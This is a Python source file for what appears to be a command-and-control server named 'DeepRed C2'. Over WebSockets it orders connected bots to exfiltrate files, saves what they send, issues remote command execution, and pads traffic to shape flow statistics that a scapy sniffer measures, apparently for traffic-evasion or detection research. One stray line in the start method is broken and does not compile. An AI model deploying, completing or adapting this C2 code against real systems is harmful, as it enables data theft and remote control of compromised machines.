"This is DeepRed C2"
import asyncio
import websockets
import json
import random
import logging
import time , os
import threading
import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from collections import defaultdict
from ConfigGenerator import config_generator
from datetime import datetime
from scapy.utils import wrpcap # write packet in pacp 
import subprocess, signal, traceback, string
from network_config_utils import resolve_settings
from concurrent.futures import TimeoutError as ConnectionTimeoutError
from pathlib import Path

class Sniffer:
    """Packet sniffer that monitors WebSocket traffic and enforces termination conditions."""
    
    def __init__(self, server, interface="ens19", protocol="tcp", port=5000):
        self.server = server  # Reference to WebSocket server
        self.conf = {
            "interface": interface,
            "protocol": protocol,
            "port": port
        }
        self.seen_packets = set()  # Store seen packet identifiers
        self.running = False
        self.lock = threading.RLock()

        self.flows = defaultdict(lambda: {
            "src2dst_packets": 0, "src2dst_bytes": 0, "src2dst_max_ps": 0,
            "dst2src_packets": 0, "dst2src_bytes": 0, "dst2src_max_ps": 0
        })

        self.packets = []  # List to store packets for PCAP file

    def packet_callback(self, packet):
        """Process incoming packets and update client statistics."""
        if not packet.haslayer(IP) or not packet.haslayer(TCP):
            return  # Ignore non-TCP packets
        
        ip_layer = packet[IP]
        tcp_layer = packet[TCP]
        packet_id = (ip_layer.src, ip_layer.dst, tcp_layer.sport, tcp_layer.dport, tcp_layer.seq, tcp_layer.ack)

        with self.lock: 
            if packet_id in self.seen_packets:
                return  # Ignore exact duplicate retransmissions
            self.packets.append(packet)  # Add packet to the list

            self.seen_packets.add(packet_id) 
            src_ip = ip_layer.src
            dst_ip = ip_layer.dst
            src_port = tcp_layer.sport
            dst_port = tcp_layer.dport
            packet_size = len(packet)

            if (src_ip, src_port, dst_ip, dst_port) in self.flows:
                self.flows[(src_ip, src_port, dst_ip, dst_port)]['src2dst_packets'] += 1
                self.flows[(src_ip, src_port, dst_ip, dst_port)]["src2dst_bytes"] += packet_size
                self.flows[(src_ip, src_port, dst_ip, dst_port)]["src2dst_max_ps"] = max(self.flows[(src_ip, src_port, dst_ip, dst_port)]["src2dst_max_ps"], packet_size)
            elif (dst_ip, dst_port, src_ip, src_port) in self.flows:
                self.flows[(dst_ip, dst_port, src_ip, src_port)]['dst2src_packets'] += 1
                self.flows[(dst_ip, dst_port, src_ip, src_port)]["dst2src_bytes"] += packet_size 
                self.flows[(dst_ip, dst_port, src_ip, src_port)]["dst2src_max_ps"] = max(self.flows[(dst_ip, dst_port, src_ip, src_port)]["dst2src_max_ps"], packet_size)
            else:
                self.flows[(src_ip, src_port, dst_ip, dst_port)] = {'src2dst_packets': 1, "src2dst_bytes": packet_size, "src2dst_max_ps": packet_size, 'dst2src_packets': 0, "dst2src_bytes": 0, "dst2src_max_ps": 0}  
            
    def run_sniffing(self):
        """Start sniffing packets in a separate thread."""
        filter_rule = f"tcp and host 10.11.54.137 and port {self.conf['port']}"
        print(f"Sniffing started with filter: {filter_rule} on {self.conf['interface']}")
        scapy.sniff(iface=self.conf["interface"], filter=filter_rule, prn=self.packet_callback, store=False)
 
    def print_statistics(self):
            while self.running:
                time.sleep(5)  # Print every 5 seconds
                with self.lock:
                    print("\n--- Live Traffic Statistics ---")
                    for flow_key, stats in self.flows.items():
                        print(f"Flow {flow_key}:")
                        print(f"  ↳ Sent: {stats['src2dst_packets']} packets, {stats['src2dst_bytes']} bytes (Max PS: {stats['src2dst_max_ps']})")
                        print(f"  ↳ Received: {stats['dst2src_packets']} packets, {stats['dst2src_bytes']} bytes (Max PS: {stats['dst2src_max_ps']})")
                        print(f"===============> src :{self.src} dst: {self.dst} total packet {self.packet} ack: {self.ack}")

    def start(self):
        """Start sniffer in a background thread."""
        if self.running:
            return
        self.running = True
        threading.Thread(target=self.run_sniffing, daemon=True).start()
        #threading.Thread(target=self.print_statistics, daemon=True).start()
        print(f"Packet sniffer started on interface '{self.conf['interface']}' monitoring {self.conf['protocol'].upper()} port {self.conf['port']}")

    def stop(self):
        """Stop sniffing."""
        self.running = False

class WebSocketServer:
    """WebSocket server that assigns commands and tracks communication statistics."""

    def __init__(self,  check_termination_condition:bool= False ):
        self.check_termination_condition= check_termination_condition
        #self.underlay_limit = underlay_limit 
        self.clients = {}  # Stores client stats
        self.sniffer = Sniffer(self)  # Attach the Sniffer class
        self.loop = asyncio.get_event_loop()
        self.sniffer.start()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        #set relative path
        project_root = Path(__file__).resolve().parent.parent
        self.parent_folder = project_root / "websocket"
        # Ensure the log directory exists
        log_dir = f"{self.parent_folder}/log"
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        logging.getLogger('websockets').setLevel(logging.WARNING)  # Set to WARNING or higher
        logging.getLogger('asyncio').setLevel(logging.WARNING)  # Set to WARNING or higher
        logging.basicConfig(
            filename=f"{self.parent_folder}/log/output-{current_time}.log",          # Log to this file
            filemode='w',  # Set to 'a' to append to the log file
            level=logging.DEBUG,             # Set log level to DEBUG (you can adjust it)
            format='%(asctime)s.%(msecs)03d - %(levelname)s - %(message)s',  # Log format with microseconds
             )
    async def exfil(self, websocket, client_id, key , value):
        await websocket.send(json.dumps({key:value}))
        with self.sniffer.lock:  
             sniffed_stats = self.sniffer.flows.get(client_id, {}).copy()  

        # Merge sniffer statistics into self.clients before logging
        self.clients[client_id].update(sniffed_stats)
        logging.info(f"Sent Exfil action  {key}: {value} to be  executed on client: {client_id} underlying parmams: {self.clients[client_id]}")
        store_exfiled_files = f"{self.parent_folder}/exfiled_data/{value}"
        with open(store_exfiled_files, "wb") as file:
            while True:
                data = await websocket.recv()
                #await asyncio.sleep(.01)       
                if not data:
                    break
                if data == "exfil_done": # we send a signal to show that all chunks of the file has sent
                    break
                file.write(data)
            file.close()
            logging.info(f"✅ Exfil completed for file: {value} from the client: {client_id} underlying parmams: {self.clients[client_id]}")
            print('✅ Exfil completed')

    async def rce(self, websocket, client_id, key, value):
        # Send command to client
        await websocket.send(json.dumps({key:value}))
        with self.sniffer.lock:  
             sniffed_stats = self.sniffer.flows.get(client_id, {}).copy()  

        # Merge sniffer statistics into self.clients before logging
        self.clients[client_id].update(sniffed_stats)
        logging.info(f"Sent RCE action {key}: {value} to be  executed on client: {client_id} underlying parmams: {self.clients[client_id]}")

        # Receive execution result
        rce_output = await websocket.recv()
       
        logging.info(f"💻 RCE output {key}: {value} to be  executed on client: {client_id} underlying parmams: {self.clients[client_id]}")
        #print(f"💻 RCE output {rce_output}")
        print(f"💻 RCE successfully executed")
    def get_client_id(self, websocket):
        """Generate a unique client identifier using IP and source port."""
        peername = websocket.remote_address
        if peername:
            return (peername[0], peername[1], "10.11.54.137", 5000)
            #return f"{peername[0]}:{peername[1]}"
        return "unknown_client"
    def generate_random_string(self,size):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size)) 
    async def terminate_client(self, client_id):
        """Gracefully close WebSocket connection when termination criteria are met."""
        print(f"⚠️ [{client_id}] Termination conditions met. Closing connection.")
        logging.info(f"⚠️ [{client_id}] Termination conditions met. Closing connection.")
        try:
            del self.clients[client_id]
        except KeyError:
            pass

    async def handle_client(self, websocket, path):
        client_id = self.get_client_id(websocket)
        logging.info(f"Client connected: {client_id}")
        client_config=  await websocket.recv()
        self.config = json.loads(client_config)
        print(client_id)
        print(self.config)
        self.clients[client_id] = {
            "src2dst_packets": 0, "src2dst_bytes": 0, "src2dst_max_ps": 0,
            "dst2src_packets": 0, "dst2src_bytes": 0, "dst2src_max_ps": 0
        }
        try:
            for key,value in self.config.items():
                # if it is exfil 
                if "exfil" in key:
                    await self.exfil(websocket=websocket,client_id=client_id, key=key ,value=value)
                    #IAT between each command to be executed 
                    await asyncio.sleep(random.randint(1,2))
                elif "src2dst_max_ps" in key and value != None:
                    
                    await websocket.send(json.dumps({key:value}))
                    await websocket.recv()
                    print("🔥 src2dst_max_ps recieved from bot")
                    logging.info(f"🔥 src2dst_max_ps recieved from bot {client_id}")
                elif "dst2src_max_ps" in key and value != None:
                    await websocket.send(json.dumps({key:value}))
                    pad= self.generate_random_string(self.config["dst2src_max_ps"])
                    await websocket.send(pad)
                elif "src2dst_packets" in key and value != None and value > 0:
                    await websocket.send(json.dumps({key:value}))
                    try:
                        while True:
                            message = await websocket.recv()  # Receive message from the WebSocket connection
                            if message == "END":
                                break  # Exit the loop and close the connection
                            # You can process the message here
                        logging.info(f"🔥 Excute src2dst_packets  {client_id}")
                        print ("🔥Execute src2dst_packets")
                    except websockets.exceptions.ConnectionClosed:
                        print("Connection closed")
                elif "src2dst_bytes" in key and value != None and value > 0:
                    await websocket.send(json.dumps({key:value}))
                    message = await websocket.recv()
                    logging.info(f"🔥 Excute src2dst_bytes  {client_id}")
                    print ("🔥Execute src2dst_bytes")
                elif "dst2src_packets" in key and value != None and value > 0:
                    await websocket.send(json.dumps({key:value}))
                    pad = ""
                    for i in range(value):
                        await websocket.send(pad) 
                    await websocket.send("END")
                    logging.info(f"🔥 Excute dst2src_packets  {client_id}")
                    print ("🔥Execute dst2src_packets")                  
                elif "dst2src_bytes" in key and value != None and value > 0:
                    await websocket.send(json.dumps({key:value}))
                    pad= self.generate_random_string(self.config["dst2src_bytes"])
                    await websocket.send(pad) 
                    logging.info(f"🔥 Excute dst2src_bytes  {client_id}")
                    print ("🔥Execute dst2src_bytes")                            
                elif "rce" in key:
                    await self.rce(websocket=websocket,client_id=client_id, key=key ,value=value)
                    #IAT between each command to be executed 
                    await asyncio.sleep(random.randint(1,2))
                if self.check_termination_condition: # check if we need asses the termination or let all config executed without problems
                    if self.check_termination(client_id): # Check if termination conditions are met
                        print(f"\033[31m⚠️ [{client_id}] Termination conditions met. Closing connection.\033[0m")
                        logging.info(f"⚠️ [{client_id}] Termination conditions met. Closing connection.\033[0m ==>underlying parmams: {self.clients[client_id]}")
                        asyncio.run_coroutine_threadsafe(self.terminate_client(client_id), self.loop)
                        if websocket.open:
                            await websocket.close()
                        if client_id in self.clients:
                            del self.clients[client_id]  # Remove client from tracking

            # if cliend did close during the loop then here we close it
            await websocket.send(json.dumps({"finish":"finish"}))
            if websocket.open:
                await websocket.close()
            if client_id in self.clients:
                del self.clients[client_id]  
        except websockets.exceptions.ConnectionClosed:
            print(f"🔌 Client disconnected: {client_id}")
            if client_id in self.clients:
                del self.clients[client_id]
        finally: # when client execute websocke.close()
            print(f"🔌 Connection has ended: {client_id}")
            logging.info(f"🔌 Connection has ended: {client_id}")
    def check_termination(self, client_id):
        """Check if termination conditions for a client are met based on sniffed packets."""
        with self.sniffer.lock:  
            stats_snapshot = self.sniffer.flows.copy()
        # FIX: Ensure client_id is a tuple before checking flows
        if isinstance(client_id, str):
            print(f"❌ Invalid format for client_id: {client_id}. Expected a tuple.")
            return False  

        if client_id not in stats_snapshot:
            print(f"❌ No recorded packets for {client_id}. Available flows: {list(stats_snapshot.keys())}")
            return False  

        conditions = self.config["termination_conditions"]
        stats = stats_snapshot.get(client_id, {})
        print("============================", self.config["underlay_limit"])
        print(f"🔍 Checking termination for {client_id}: {stats}")  # Debugging
        for condition in conditions:
            stat_value = stats.get(condition, 0)
            limit_value = self.config["underlay_limit"].get(condition, float("inf"))
            print(f"Condition: {condition}, Stat: {stat_value}, Limit: {limit_value}, Passed: {stat_value >= limit_value}")        
        #Return True: If all the conditions in the conditions list are satisfied. 
        return all(
            stats.get(condition, 0) >= self.config["underlay_limit"].get(condition, float("inf"))
            for condition in conditions
        )
    async def start(self, ip, port):
        async with websockets.serve(self.handle_client, ip, port):
            print(f"🚀 Starting \033[91mDeepRed\033[0m server on WebSocket://{ip}:{port}/")
            ptint locations logs, exfil DeprecationWarning
            await asyncio.Future()  # Keep running




async def main():
    ip, port = resolve_settings()
    server = WebSocketServer(check_termination_condition=False )
    await server.start(ip, port)
if __name__ == "__main__":
    asyncio.run(main())